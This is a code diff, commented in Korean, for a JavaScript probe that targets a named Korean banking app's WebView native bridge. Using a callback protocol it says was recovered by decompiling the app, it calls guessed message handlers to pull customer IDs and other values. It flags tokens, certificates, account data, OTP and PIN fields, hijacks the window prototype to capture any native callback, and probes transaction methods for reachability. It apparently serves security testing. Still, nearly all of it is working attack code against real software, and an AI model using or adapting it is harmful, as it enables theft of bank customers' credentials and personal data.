@@ -109,27 +109,58 @@ const ACTION=[
 const DISPATCHERS=["smartbank","kbank","Kbank","SmartBank","native","nativeBridge","KbankBridge",
   "JavaScriptService","kbankWebView","windowLoaded","iOS","consoleLog"];
 
-// 반환값 포착: 네이티브가 어떤 콜백을 부르든 잡도록 window에 catch-all 설치
-window.__rt=(tag,val)=>{const s=String(val).slice(0,160);
-  const sens=/custid|cust_id|member|uuid|phone|ssn|account|cert|token|signature|clip/i.test(tag+val);
-  L(`[응답] ${tag} = ${s}`+(sens?"  ⚠️ 민감값!":""),sens?"bad":"ok");};
-// 흔한 콜백명들을 __rt로 연결(네이티브가 이 이름들로 돌려줄 수 있음)
-["nativeCallback","bridgeCallback","onNativeResult","webkitCallback","kbankCallback",
- "callback","jsCallback","resultCallback","callBackId"].forEach(n=>{try{window[n]=(...a)=>window.__rt(n,a.join(","));}catch(e){}});
+// ── 응답 '값' 포착: 콜백명/포맷과 무관하게 네이티브가 돌려준 값 전체를 표시 ──
+function fmt(a){try{return (a&&typeof a==="object")?JSON.stringify(a):String(a);}catch(e){return String(a);}}
+const SENS=/custid|cust_id|member|userid|uuid|phone|mobile|ssn|jumin|birth|account|acct|balance|cert|token|signature|sign|clip|session|cookie|pin|passw|bio|otp|motp|mpki|card|regi|serial/i;
+function showResp(name,args){
+  const vals=args.map(fmt); const joined=vals.join(" | ");
+  const sens=SENS.test(name+" "+joined);
+  L(`[응답] ${name}(${args.length}개인자) = ${joined.slice(0,6000)}`+(sens?"   ⚠️ 민감값!":""),sens?"bad":"ok");
+}
+// (a) 흔한 고정 콜백명 다수 정의 → 그 이름으로 돌려주면 값 표시
+["nativeCallback","bridgeCallback","onNativeResult","webkitCallback","kbankCallback","callback",
+ "jsCallback","resultCallback","nativeBridgeCallback","onResult","responseHandler","__rt","callBackId",
+ "nativeCallBack","webkit_callback","smartbankCallback"].forEach(n=>{try{window[n]=(...a)=>showResp(n,a);}catch(e){}});
+// (b) catch-all: window의 '정의되지 않은 함수' 호출을 프로토타입 Proxy로 전부 가로챔
+//     → 네이티브가 callBackId로 넘긴 '임의 함수명'으로 window.xxx(result) 호출해도 값 포착
+try{
+  const realProto=Object.getPrototypeOf(window)||Object.prototype;
+  Object.setPrototypeOf(window, new Proxy(realProto,{
+    get(t,p,r){
+      if(typeof p!=="string") return Reflect.get(t,p,r);
+      if(p in t) return Reflect.get(t,p,r);                 // 원래 프로토타입 속성은 유지
+      if(/^__proto__$|^constructor$|^then$|^Symbol/.test(p)) return undefined;
+      return (...a)=>showResp(p,a);                          // 미정의 접근 → 콜백으로 간주, 값 표시
+    }
+  }));
+  L("catch-all 설치됨 — 임의 콜백명 응답도 값까지 표시","muted");
+}catch(e){ L("catch-all 설치 실패(고정 콜백명으로만 포착): "+e,"muted"); }
 
 const mh=(window.webkit&&window.webkit.messageHandlers)||{};
 function send(h,payload){try{if(mh[h]){mh[h].postMessage(payload);return true;}}catch(e){}return false;}
 
 // 1) 각 READ 메서드를 (a)개별 핸들러로 (b)디스패처+method 로 호출
 L(`[READ] 값 반환 시도 (${READ.length}개):`,"muted");
+// 디컴파일로 확정한 요청 규약(FeatureChannel 커맨드 모델 cstring):
+//   callBackId        = 네이티브가 응답 시 호출할 JS 전역 함수명  (정확 키, 대문자 B)
+//   callBackParam1..5 = 패스스루 컨텍스트(네이티브가 응답 인자로 되돌려줌) → 포맷 확인용 마커
+//   호출형: window.<callBackId>( ...응답값/파라미터... )
+function cbFields(cb){return {
+  callBackId:cb,                                   // ← 정확 키
+  callBackParam1:"P1",callBackParam2:"P2",callBackParam3:"P3",callBackParam4:"P4",callBackParam5:"P5",
+  callback:cb,callbackId:cb                         // 혹시 모를 변형 대비(catch-all로도 포착됨)
+};}
 READ.forEach(m=>{
   let hit=false;
+  const cb="rtcb_"+m.replace(/[^A-Za-z0-9]/g,"");
+  try{window[cb]=(...a)=>showResp(cb,a);}catch(e){}  // callBackId로 지정한 전역 함수 실제 정의
+  const body=Object.assign({param:"custid",key:"custid",data:{key:"custid"}},cbFields(cb));
   // (a) 메서드명 자체가 핸들러명인 경우 — body는 JSON 문자열
-  hit|=send(m,JSON.stringify({param:"custid",callBackId:"__rt",callback:"nativeCallback"}));
+  hit|=send(m,JSON.stringify(body));
   hit|=send(m,"custid");
   // (b) 디스패처 핸들러에 method 필드로
-  DISPATCHERS.forEach(d=>{hit|=send(d,JSON.stringify({method:m,data:{key:"custid"},callBackId:"__rt",callback:"nativeCallback"}));});
-  L(`  ${m}: ${hit?"전송됨 → [응답] 확인":"핸들러 없음"}`,hit?"ok":"muted");
+  DISPATCHERS.forEach(d=>{hit|=send(d,JSON.stringify(Object.assign({method:m,data:{key:"custid"}},cbFields(cb))));});
+  L(`  ${m}: ${hit?"전송됨 → 응답 오면 [응답]에 값+P1~P5 마커 표시":"핸들러 없음"}`,hit?"ok":"muted");
 });
 
 // 2) 노출된 핸들러 열거
@@ -150,11 +181,11 @@ L("—".repeat(46));
 L(`[ACTION] 도달 확증 probe (${ACTION.length}개, 무효 파라미터 — 실제 실행 아님):`,"muted");
 ACTION.forEach(m=>{
   const ack="__ack_"+m.replace(/[^A-Za-z0-9]/g,"");
-  // 네이티브가 이 ack 콜백을 부르면 = 해당 메서드 핸들러가 실제로 디스패치됨 = 도달 확증
-  try{window[ack]=(...a)=>L(`  ${m}: 도달 확증 ✅ (응답=${String(a.join(",")).slice(0,60)})`,"bad");}catch(e){}
-  const probe=JSON.stringify({__probe:"reachability-only",callBackId:ack,callback:ack});   // 유효 거래값 없음 → 정상 핸들러면 거부
+  // 네이티브가 이 ack 콜백을 부르면 = 해당 메서드 핸들러가 실제로 디스패치됨 = 도달 확증 (+응답값 표시)
+  try{window[ack]=(...a)=>L(`  ${m}: 도달 확증 ✅ (응답=${a.map(x=>{try{return typeof x==="object"?JSON.stringify(x):String(x)}catch(e){return String(x)}}).join(" | ").slice(0,300)})`,"bad");}catch(e){}
+  const probe=JSON.stringify(Object.assign({__probe:"reachability-only"},cbFields(ack)));   // 유효 거래값 없음 → 정상 핸들러면 거부
   let sent=send(m,probe);
-  DISPATCHERS.forEach(d=>{sent=send(d,JSON.stringify({method:m,data:{__probe:"reachability-only"},callBackId:ack,callback:ack}))||sent;});
+  DISPATCHERS.forEach(d=>{sent=send(d,JSON.stringify(Object.assign({method:m,data:{__probe:"reachability-only"}},cbFields(ack))))||sent;});
   L(`  ${m}: ${sent?"probe 전송 → 응답 오면 도달 확증":(names.length?"도달 가능성(추론)":"핸들러 없음")}`,
     sent?"muted":(names.length?"bad":"muted"));
 });
